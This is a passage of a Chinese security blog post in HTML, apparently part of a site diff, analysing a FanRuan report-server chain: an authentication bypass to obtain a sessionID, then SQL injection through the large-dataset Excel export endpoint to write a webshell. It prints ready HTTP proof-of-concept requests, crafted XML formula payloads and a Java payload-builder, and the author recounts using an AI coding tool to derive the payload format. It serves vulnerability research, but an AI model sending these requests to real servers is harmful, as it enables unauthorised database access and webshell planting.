class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>然后通过&#x2F;file加载jsp加载器。注意，如果要创建不同文件，as 后面的数据库名也要改成没出现过的。</p>
+<h2 id="官方修复-1"><a href="#官方修复-1" class="headerlink" title="官方修复"></a>官方修复</h2><p>首先不对参数进行模板渲染：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556544384-d3345928-31b5-42c3-910c-abb427a416a0.png"  alt="img"></p>
+<p>对U+FEFF处理：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773556570400-a4205574-b4ab-4752-a292-03d8ac258520.png"  alt="img"></p>
+<h1 id="export-excel-SQL注入写webshell"><a href="#export-excel-SQL注入写webshell" class="headerlink" title="export&#x2F;excel SQL注入写webshell"></a>export&#x2F;excel SQL注入写webshell</h1><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90947" >https://xz.aliyun.com/news/90947<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/628UNSos2lxNy5QUCLRznA" >https://mp.weixin.qq.com/s/628UNSos2lxNy5QUCLRznA<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773540164495-ccc2660f-6625-4e93-9b0a-68327a78f2d3.png"  alt="img"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="sessionID获取"><a href="#sessionID获取" class="headerlink" title="sessionID获取"></a>sessionID获取</h3><p>此漏洞需要先获取一个sessionID。</p>
+<p>直接访问漏洞路由（通过之前获取的映射文件搜索），返回401：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773541319671-f0492a0d-d2ce-4a28-92bc-5e8f965e8779.png"  alt="img"></p>
+<p>说明需要鉴权。查看日志，发现没有报错，那只能手动推测鉴权位置。由于访问的是一个controller，所以一定会经过interceptor，鉴权很有可能是在那边做的。</p>
+<p>来到com.fr.third.springframework.web.servlet.HandlerExecutionChain#applyPreHandle：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773541686973-4cc4e9e0-cb1b-471e-bcae-bded0ee384b9.png"  alt="img"></p>
+<p>这里能够看到所有的interceptor：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">com.fr.decision.webservice.interceptor.DeploymentInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.SecurityHeaderInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.SystemAvailableInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.MigrationInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.EncryptionInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.RequestPreHandleInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.DecisionInterceptor</span><br><span class="line">com.fr.web.core.cluster.ReportClusterRedirectInterceptor</span><br><span class="line">com.fr.decision.webservice.interceptor.URLRateLimiterInterceptor</span><br><span class="line">com.fr.third.springframework.web.servlet.handler.ConversionServiceExposingInterceptor</span><br><span class="line">com.fr.third.springframework.web.servlet.resource.ResourceUrlProviderExposingInterceptor</span><br></pre></td></tr></table></figure>
+
+<p>这里的鉴权在DecisionInterceptor，可以通过401来判断：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773542406068-7567abea-893b-4637-9cd7-ac6c9fd12614.png"  alt="img"></p>
+<p>这里的目标是var6为true，那就得关注var5。跟进getRequestChecker：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773542838958-ed029701-842d-4931-bcf7-7ed0027d52d0.png"  alt="img"></p>
+<p>这里会调用11个checker.acceptRequest，当accept时，就会返回该checker，随后回到DecisionInterceptor调用checkRequest方法。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773542888140-69288e80-dff2-4a37-a6ea-76b1d54680d5.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773543248430-8e148214-eb80-49a6-81d2-9a12ee3be088.png"  alt="img"></p>
+<p>com.fr.decision.webservice.interceptor.handler.DecisionRequestChecker#acceptRequest会检查调用的方法和方法所在的类，是否有TemplateAuth.class和CompatibleTemplateAuth注解，如果都没有就直接通过：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773544490089-88b992c0-93c0-4792-a29b-176894a0a99c.png"  alt="img"></p>
+<p>com.fr.decision.webservice.interceptor.handler.ReportNxAdaptiveRequestChecker#acceptRequest</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773543113681-a52eecb1-7432-4afe-8df0-b2355cbec1f7.png"  alt="img"></p>
+<p>这里只要没有CompatibleTemplateAuth注解，就是直接通过。</p>
+<p>其他checker大家可以自行分析。</p>
+<p>这里最终会返回ReportNxAdaptiveRequestChecker：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773544123236-cec94c67-9ad6-4aa2-9aa8-8776745b0ab3.png"  alt="img"></p>
+<p>然后对sessionID进行校验。所以必须找一个地方生成有效的sessionID。</p>
+<p>根据文章（<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90947%EF%BC%89%EF%BC%8CsessionID%E9%80%9A%E8%BF%87/webroot/decision/view/report%E8%8E%B7%E5%8F%96%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%99%E4%B8%AA%E8%B7%AF%E7%94%B1%E4%B9%9F%E6%9C%89%E9%89%B4%E6%9D%83%EF%BC%8C%E5%BE%97%E7%BB%95" >https://xz.aliyun.com/news/90947），sessionID通过/webroot/decision/view/report获取，不过这个路由也有鉴权，得绕<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773546070977-0004a71f-ea50-4b0c-90ff-0d2e1d923e71.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773550312526-af2c3d2b-cef0-47e3-b9b4-b4b7f949fa71.png"  alt="img"></p>
+<p>文章的思路是在com.fr.decision.webservice.interceptor.handler.ReportTemplateRequestChecker#acceptRequest返回true，然后让其checkRequest返回true，从而绕过鉴权。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773543354054-e9de5d84-fa32-494e-9dd9-6a8430e1af19.png"  alt="img"></p>
+<p>这里会进入getTemplateId，最终到达analyzeTemplateID：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773545221624-d7f31e44-57ac-41f6-9fc0-0d893fce256c.png"  alt="img"></p>
+<p>接下来的过程可以去看参考文章，已经写的很详细。</p>
+<p>需要提一下，这四个参数，在新版本，大概是25年中之后，是不能有值的，不然会再次检查token。但是在更早一点的版本是可以的。在最新版本，11.5.5及之后，两种方法都没法获取sessionID了。</p>
+<p>而文章sessionID的poc为：</p>
+<p>&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report?op&#x3D;getSessionID&amp;reportlets&#x3D;[{‘reportlet’:’&#x2F;‘}]</p>
+<p>但是较新一点的版本中不能有reportlets参数，所以文章里的方法在25年中之后就用不了。</p>
+<p>下面介绍最新的，获取sessionID的方法，这是killer师傅文章中提及的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773558157027-0d6b32c6-b646-412a-bf5a-c82a5c952c85.png"  alt="img"></p>
+<p>先给出最终的poc，方便参考：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webroot/decision/view/report?op=getSessionID&amp;viewlets=[&#123;&#x27;reportlet&#x27;:&#x27;/&#x27;&#125;]</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8075</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>能发现com.fr.decision.webservice.interceptor.handler.ReportGeneralRequestChecker#checkRequest始终返回true：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773550817887-568241d5-5757-4829-af30-51258a7c1865.png"  alt="img"></p>
+<p>所以只要过acceptRequest就行，也就是过!this.containUniqueOpAndCmd就行：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773550974770-7650a918-d7c1-474b-929b-33f584c93520.png"  alt="img"></p>
+<p>看方法名就知道，得同时传入op和cmd才行，所以肯定返回false，取反成true，通过。</p>
+<p>所以就能来到目标路由，最终执行到com.fr.web.core.ReportDispatcher#dealWithRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773551154736-210637b5-0cb1-4dfd-bc31-2e92390d41dd.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773551400082-245cb97e-ca17-4d93-861a-f22f2dcb58d7.png"  alt="img"></p>
+<p>这里能看出为什么要设置op&#x3D;getSessionID。</p>
+<p>跟进generateSessionIDWithCheckRegister：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773551521463-0e08e420-6ec2-4760-8695-ed06ad033f38.png"  alt="img"></p>
+<p>var2不为null才能生成sessionID。</p>
+<p>所以看WebletFactory#createWebletByRequest：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773551568405-04da02c7-48fe-441c-a485-534d9850922a.png"  alt="img"></p>
+<p>这一段的解析，<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90947" >https://xz.aliyun.com/news/90947<i class="fas fa-external-link-alt"></i></a> 中的”条件4”段落也解释的很详细，这里不展开了。</p>
+<p>最后还有一点需要补充，其实可以直接访问&#x2F;webroot&#x2F;ReportServer，最终也是执行到ReportDispatcher#dealWithRequest，而且不会经过interceptor鉴权，这点在路由分析的时候已经说过。</p>
+<p>说句题外话。如果一开始就以&#x2F;webroot&#x2F;ReportServer获取sessionID会遇到一个问题。就是viewlets参数为什么要写成[‘reportlets’:’&#x2F;‘]，而不是只写 [] ？[‘reportlets’:’&#x2F;‘]的形式，是在访问&#x2F;webroot&#x2F;decision&#x2F;view&#x2F;report的前半段interceptor过程中得出的。但如果直接访问&#x2F;webroot&#x2F;ReportServer，就没有这个过程。所以理应满足match即可：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773558469224-7b5aee05-0417-4f0a-a1de-678b83aefa52.png"  alt="img"></p>
+<p>但这样会空指针报错。我当时就无法解决这个问题。于是拿着报错和请求问AI：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773558532503-5196c70d-72ed-420b-90ae-9602d1f8fbc4.png"  alt="img"></p>
+<p>也是得到了解决方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773558564242-1d52f52a-5455-457c-aebf-7409aaca7cb8.png"  alt="img"></p>
+<h3 id="XML格式推导"><a href="#XML格式推导" class="headerlink" title="XML格式推导"></a>XML格式推导</h3><p>SessionID获取完了，接下来开始分析这次SQL注入的点。</p>
+<p>去官网找到漏洞路由：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773191962983-f41a0eeb-dac5-4407-be2c-b15564576ac1.png"  alt="img"></p>
+<p>在导出的映射关系中进行查找：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773192031604-079e05a8-9037-4374-a8a6-33dd812274d4.png"  alt="img"></p>
+<p>有两个符合的，这里选择下面那个GET方式的进行分析。</p>
+<p>调试一下，跟进各种handleXXX后，最终来到com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler#doHandle：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773192569995-58f56a51-e566-415d-819c-533599295168.png"  alt="img"></p>
+<p>第一行验证刚刚获取的sessionID，第二行获取Calculator对象，这个对象就是帆软里专门用来执行表达式的，也是后面执行SQL语句的基础。接下来就会进入initCreator：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773192845016-6f682931-31e8-4731-a2da-0c60c02709ad.png"  alt="img"></p>
+<p>第一行读取__parameters__，这里直接传入 {} 即可，因为后面需要这个参数为空，才能进入表达式解析的过程。</p>
+<p>getEntity这行很重要，是解析传入的xml的过程。</p>
+<p>那么这里预期的XML格式是怎么样的呢？直接问AI试试（claude code + glm5）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetExcelExportHandler#getEntity中，会读取params参数，然后开</span><br><span class="line">始解析xml。请分析出这里预期的XML格式是怎么样的，把分析过程写入文档。</span><br></pre></td></tr></table></figure>
+
+<p>第一次给出的格式有问题，没有root节点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773157473737-421e1269-eb34-4bff-b61a-24a93aa48206.png"  alt="img"></p>
+<p>第二次的提示词：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&gt; xml内容如下：</span><br><span class="line"></span><br><span class="line">  &lt;LargeDatasetExcelExportJS exportFileName=&quot;waibiwaibi&quot; dsName=&quot;ds1&quot; colNames=&quot;&#123;&#125;&quot; exportFormat=&quot;excel&quot;</span><br><span class="line">  encodeFormat=&quot;UTF-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">     &lt;Parameters&gt;</span><br><span class="line"></span><br><span class="line">         &lt;Parameter&gt;</span><br><span class="line"></span><br><span class="line">             &lt;Attributes name=&quot;p1&quot;&gt;&lt;/Attributes&gt;</span><br><span class="line"></span><br><span class="line">             &lt;Object t=&quot;Formula&quot;&gt;</span><br><span class="line"></span><br><span class="line">                 &lt;Attributes&gt;sql(&#x27;FRDemo&#x27;, DECODE(&#x27;%77%61%69%62%69%77%61%69%62%69&#x27;), 1, 1)&lt;/Attributes&gt;</span><br><span class="line"></span><br><span class="line">             &lt;/Object&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/Parameter&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/Parameters&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/LargeDatasetExcelExportJS&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解析代码如下：</span><br><span class="line">         LargeDatasetExcelExportJavaScript var7 = this.getEntity(var2);</span><br><span class="line"></span><br><span class="line">         String var8 = var7.getFileName();</span><br><span class="line"></span><br><span class="line">         String var9 = var7.getDsName();</span><br><span class="line"></span><br><span class="line">  解析后，var8，var9都为null。</span><br><span class="line"></span><br><span class="line">  最终报错：</span><br><span class="line"></span><br><span class="line">  No datasource name specified for exportation.\\n\\tat com.fr.nx.app.web.v9.handler.handler.largeds.LargeDatasetEx</span><br><span class="line">  celExportHandler.initCreator(LargeDatasetExcelExportHandler.java:96)\\n\\tat com.fr.nx.app.web.v9.handler.handler</span><br><span class="line">  .largeds.LargeDatasetExcelExportHandler.doHandle(LargeDatasetExcelExportHandler.java:209)\\n\\tat</span><br><span class="line">  com.fr.nx.app.direct.AbstractExportHandler.handleRequest(AbstractExportHandler.java:22)\\n\\tat</span><br><span class="line">  com.fr.web.controller.AbstractRequestService.handle(AbstractRequestService.java:49)\\n\\tat</span><br><span class="line">  com.fr.web.controller.AbstractRequestService.handle(AbstractRequestService.java:28)\\n\\tat</span><br><span class="line">  com.fr.nx.app.web.controller.NXController.largedsExcelExportV9(NXController.java:320)\\n\\tat</span><br><span class="line">  sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\\n\\tat</span><br><span class="line">  sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\\n\\tat</span><br><span class="line">  sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\\n\\tat</span><br><span class="line">  java.lang.reflect.Method.invoke(Method.java:498)\\n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  重新阅读代码，确保得到的XML格式正确，并修改文档。</span><br></pre></td></tr></table></figure>
+
+<p>第二次修改的还是有问题，Formula没法正常赋值，没把content写在Attribute标签里，导致Fumula对象没有content为空：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">R</span> <span class="attr">class</span>=<span class="string">&quot;com.fr.nx.app.web.handler.export.largeds.bean.LargeDatasetExcelExportJavaScript&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LargeDatasetExcelExportJS</span></span></span><br><span class="line"><span class="tag">        <span class="attr">exportFileName</span>=<span class="string">&quot;any1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">dsName</span>=<span class="string">&quot;ds1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">colNames</span>=<span class="string">&#x27;&#123;&#125;&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameters</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Attributes</span> <span class="attr">name</span>=<span class="string">&quot;p3&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">O</span> <span class="attr">t</span>=<span class="string">&quot;Formula&quot;</span>&gt;</span>=sql(&#x27;FRDemo&#x27;, DECODE(&#x27;%77%61%69%62%69%77%61%69%62%69&#x27;), 1, 1)<span class="tag">&lt;/<span class="name">O</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Parameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LargeDatasetExcelExportJS</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">R</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773193719646-027085dc-0c07-4908-a66f-a2da1bdb8048.png"  alt="img"></p>
+<p>第三次提示词：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还是有问题，t=&quot;Formula&quot;时，最后Formula对象的content是空字符串</span><br></pre></td></tr></table></figure>
+
+<p>最终给出的xml是能够满足要求的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">R</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LargeDatasetExcelExportJS</span></span></span><br><span class="line"><span class="tag">        <span class="attr">exportFileName</span>=<span class="string">&quot;报表导出&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">dsName</span>=<span class="string">&quot;ds1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">colNames</span>=<span class="string">&quot;&#123;&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameters</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Attributes</span> <span class="attr">name</span>=<span class="string">&quot;sqlParam&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">O</span> <span class="attr">t</span>=<span class="string">&quot;Formula&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.fr.base.Formula&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Attributes</span>&gt;</span>sql(&#x27;FRDemo&#x27;, &#x27;SELECT * FROM table&#x27;)<span class="tag">&lt;/<span class="name">Attributes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">O</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Parameters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LargeDatasetExcelExportJS</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">R</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773193819812-346bdf30-2e19-4c4d-937a-14add296117d.png"  alt="img"></p>
+<p>这个和参考文章里的有所不同，这里LargeDatasetExcelExportJS和Parameters为父子关系。</p>
+<p>回到initCreator，接着跟进dealParam：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773193972934-1e29e954-5397-4c70-a6b1-c19061a49300.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1773194019303-ae222de4-6b9b-48b3-8a28-85fd828b328b.png"  alt="img"></p>
+<p>这里可以直接让var8为空，这样就一定进入表达式执行的if。要让var8为空，那var7就是空，var7就是我们传入的functionParams参数，它要为 {}</p>
+<p>同时注意132行的，var18，容易看出，这里var18也要是null，所以var6最好也是空，而var6就是在initCreator里传入的__parameters__参数，所以这就是为什么上面说要传入 {}</p>
+<p>总结一下，我们现在能够控制表达式的请求包大致长这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/webroot/decision/nx/report/v9/largedataset/export/excel</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8075</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line"><span class="attribute">sessionID</span><span class="punctuation">: </span>7217201b-cc45-4f57-b458-ba5b0629cf6d</span><br><span class="line"><span class="attribute">params</span><span class="punctuation">: </span>&#123;&#123;urlesc(&lt;R&gt;</span><br><span class="line">    &lt;LargeDatasetExcelExportJS</span><br><span class="line">        exportFileName=&quot;any&quot;</span><br><span class="line">        dsName=&quot;ds1&quot;</span><br><span class="line">        colNames=&quot;&#123;&#125;&quot;&gt;</span><br><span class="line">        &lt;Parameters&gt;</span><br><span class="line">            &lt;Parameter&gt;</span><br><span class="line">                &lt;Attributes name=&quot;sqlParam&quot;/&gt;</span><br><span class="line">                &lt;O t=&quot;Formula&quot; class=&quot;com.fr.base.Formula&quot;&gt;</span><br><span class="line">                    &lt;Attributes&gt;sql(&#x27;FRDemo&#x27;, &#x27;SELECT * FROM table&#x27;, 1)&lt;/Attributes&gt;</span><br><span class="line">                &lt;/O&gt;</span><br><span class="line">            &lt;/Parameter&gt;</span><br><span class="line">        &lt;/Parameters&gt;</span><br><span class="line">    &lt;/LargeDatasetExcelExportJS&gt;</span><br><span class="line">&lt;/R&gt;)&#125;&#125;</span><br><span class="line">__parameters__: &#123;&#125;</span><br><span class="line"><span class="attribute">functionParams</span><span class="punctuation">: </span>&#123;&#125;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>要注意，先前生成的sessionID是会过期的，所以最好每次发包都重新生成一个。</p>
+<p>最后补充一个可以直接生成xml文件的方法。</p>
+<p>这里直接利用帆软自带的com.fr.general.xml.GeneralXMLTools#writeXMLableAsString：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fr.base.Formula;</span><br><span class="line"><span class="keyword">import</span> com.fr.base.Parameter;</span><br><span class="line"><span class="keyword">import</span> com.fr.general.xml.GeneralXMLTools;</span><br><span class="line"><span class="keyword">import</span> com.fr.nx.app.web.handler.export.largeds.bean.LargeDatasetExcelExportJavaScript;</span><br><span class="line"><span class="keyword">import</span> com.fr.stable.CommonCodeUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tmp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String s = &quot;[op&quot;;</span></span><br><span class="line"><span class="comment">//        String cjkEncode = CommonCodeUtils.cjkEncode(s);</span></span><br><span class="line"><span class="comment">//        System.out.println(cjkEncode);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Parameter</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Parameter</span>();</span><br><span class="line">        <span class="type">Formula</span> <span class="variable">formula</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Formula</span>(<span class="string">&quot;sql(&#x27;FRDemo&#x27;, &#x27;insert * FROM table&#x27;, 1)&quot;</span>);</span><br><span class="line">        parameter.setName(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">        parameter.setValue(formula);</span><br><span class="line"></span><br><span class="line">        <span class="type">LargeDatasetExcelExportJavaScript</span> <span class="variable">largeDatasetExcelExportJavaScript</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LargeDatasetExcelExportJavaScript</span>();</span><br><span class="line">        largeDatasetExcelExportJavaScript.setDsName(<span class="string">&quot;ds1&quot;</span>);</span><br><span class="line">        largeDatasetExcelExportJavaScript.setParameters(<span class="keyword">new</span> <span class="title class_">Parameter</span>[]&#123;parameter&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> 